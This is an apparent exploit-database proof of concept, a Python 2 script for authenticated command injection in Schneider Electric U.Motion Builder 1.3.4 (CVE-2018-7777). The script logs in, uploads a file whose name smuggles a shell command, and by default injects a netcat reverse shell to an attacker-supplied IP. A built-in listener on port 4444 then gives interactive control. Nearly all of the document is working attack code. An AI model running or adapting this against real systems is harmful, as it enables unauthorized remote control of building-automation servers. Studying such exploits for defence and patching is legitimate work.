# Exploit Title: Schneider Electric U.Motion Builder 1.3.4 - Authenticated Command Injection
# Date: 2018-08-01
# Exploit Author: Cosmin Craciun
# Vendor Homepage: https://www.se.com
# Version: <= 1.3.4
# Tested on: Delivered Virtual Appliance running on Windows 10 x64
# CVE : CVE-2018-7777
# References: https://github.com/cosmin91ro

#!/usr/bin/oython


from __future__ import print_function
import httplib
import urllib
import argparse
import re
import sys
import socket
import threading
import time

parser = argparse.ArgumentParser(description='PoC')
parser.add_argument('--target',  help='IP or hostname of target', required=True)
parser.add_argument('--port',  help='TCP port the target app is running', required=True, default='8080')
parser.add_argument('--username',  help='TCP port the target app is running', required=True, default='admin')
parser.add_argument('--password',  help='TCP port the target app is running', required=True, default='admin')
parser.add_argument('--command', help='malicious command to run', default='shell')
parser.add_argument('--src_ip', help='IP of listener for the reverse shell', required=True)
parser.add_argument('--timeout', help='time in seconds to wait for a response', type=int, default=3)

class Exploiter(threading.Thread):
    def __init__ (self, target, port, timeout, uri, body, headers, shell_mode):
        threading.Thread.__init__(self)
        self.target = target
        self.port = port
        self.timeout = timeout
        self.uri = uri
        self.body = body
        self.headers = headers
        self.shell_mode = shell_mode

    def send_exploit(self, target, port, timeout, uri, body, headers):
        print('Sending exploit ...')
        conn = httplib.HTTPConnection("{0}:{1}".format(target, port), timeout=timeout)
        conn.request("POST", uri, body, headers)
        print("Exploit sent")
        if not self.shell_mode: print("Getting response ...")

        try:
            response = conn.getresponse()
            if not self.shell_mode: print(str(response.status) + " " + response.reason)
            data = response.read()
            if not self.shell_mode: print('Response: {0}\r\nCheck the exploit result'.format(data))

        except socket.timeout:
            if not self.shell_mode: print("Connection timeout while waiting response from the target.\r\nCheck the exploit result")

    def run(self):
        self.send_exploit(self.target, self.port, self.timeout, self.uri, self.body, self.headers)

class Listener(threading.Thread):
    def __init__(self, src_ip):
        threading.Thread.__init__(self)
        self.src_ip = src_ip

    def run(self):
        self.listen(self.src_ip)

    def listen(self, src_ip):
        TCP_IP = src_ip
        TCP_PORT = 4444
        BUFFER_SIZE = 1024

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((TCP_IP, TCP_PORT))
            print("Listener open on port {0}".format(TCP_PORT))
            s.listen(1)

            conn, addr = s.accept()
            print('Exploited: ' + str(addr))

            while 1:
                comm = raw_input("shell$ ").strip()
                if comm == "quit":
                    conn.close()
                    sys.exit(0)

                if comm != "":
                    conn.send(comm + " 2>&1" + "\x0a")
                    while 1:
                        data = conn.recv(BUFFER_SIZE)
                        if not data: break
                        print(data, end="")
                        if "\x0a" in data: break

        except Exception as ex:
            print("Could not start listener")
            print(ex)

def login(target, port, username, password):
    uri = "http://{0}:{1}/umotion/modules/system/user_login.php".format(target, port)

    params = urllib.urlencode({
        'username': username,
        'password': password,
        'rememberMe': '1',
        'context': 'configuration',
        'op': 'login'
    })

    headers = {
        "Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*"
    }

    try:
        conn = httplib.HTTPConnection("{0}:{1}".format(target, port))
        conn.request("POST", uri, params, headers)
        response = conn.getresponse()
        print(str(response.status) + " " + response.reason)
        data = response.read()
    except socket.timeout:
        print("Connection timeout while logging in. Check if the server is available")
        return


    cookie = response.getheader("Set-Cookie")
    #print(cookie)

    r = re.match(r'PHPSESSID=(.{26});.*loginSeed=(.{32})', cookie)
    if r is None:
        print("Regex not match, could not get cookies")
        return

    if len(r.groups()) < 2:
        print("Error while getting cookies")
        return

    sessid = r.groups()[0]
    login_seed = r.groups()[1]

    return sessid, login_seed

    conn.close()


def encode_multipart_formdata(fields, files):
    LIMIT = '----------lImIt_of_THE_fIle_eW_$'
    CRLF = '\r\n'
    L = []
    for (key, value) in fields:
        L.append('--' + LIMIT)
        L.append('Content-Disposition: form-data; name="%s"' % key)
        L.append('')
        L.append(value)
    for (key, filename, value) in files:
        L.append('--' + LIMIT)
        L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key, filename))
        L.append('Content-Type: application/x-gzip')
        L.append('')
        L.append(value)
    L.append('--' + LIMIT + '--')
    L.append('')
    body = CRLF.join(L)
    content_type = 'multipart/form-data; boundary=%s' % LIMIT
    return content_type, body


def exploit(target, port, username, password, command, timeout):
    uri = "http://{0}:{1}/umotion/modules/system/update_module.php".format(target, port)

    fields = [
        ('choose_update_mode', 'MANUAL'),
        ('add_button', '0'),
        ('format', 'json'),
        ('step', '2'),
        ('next', '1'),
        ('name_update_file', ''),
        ('path_update_file', ''),
        ('type_update_file', '')
    ]

    listener = None
    if command == "shell":
        shell_mode = True
        command = "nc -e $SHELL {0} 4444".format(args.src_ip)
        listener = Listener(args.src_ip)
        listener.start()
        time.sleep(3)
    else:
        shell_mode = False

    files = [
        ('update_file', 'my;{0};file.tar.gz'.format(command), "\x1f\x8b")
    ]

    content_type, body = encode_multipart_formdata(fields, files)

    if not shell_mode or (shell_mode and listener and listener.isAlive()):
        print('Logging in ...')
        sess_id, login_seed = login(target, port, username, password)
        if sess_id is None or login_seed is None:
            print('Error while logging in')
            return

        print('Logged in ! ')

        headers = {
            'Accept': 'application/json,text/javascript,*/*; q=0.01',
            'Accept-Encoding': 'gzip,deflate',
            'Referer': 'http://{0}:{1}/umotion/modules/system/externalframe.php?context=configuration'.format(target, port),
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Length': len(body),
            'Content-Type': content_type,
            'Connection': 'keep-alive',
            'Cookie': 'PHPSESSID={0}; loginSeed={1}'.format(sess_id, login_seed)
        }

        exploiter = Exploiter(target, port, timeout, uri, body, headers, shell_mode)
        exploiter.start()

if __name__ == '__main__':
    args = parser.parse_args()
    exploit(args.target, args.port, args.username, args.password, args.command, args.timeout)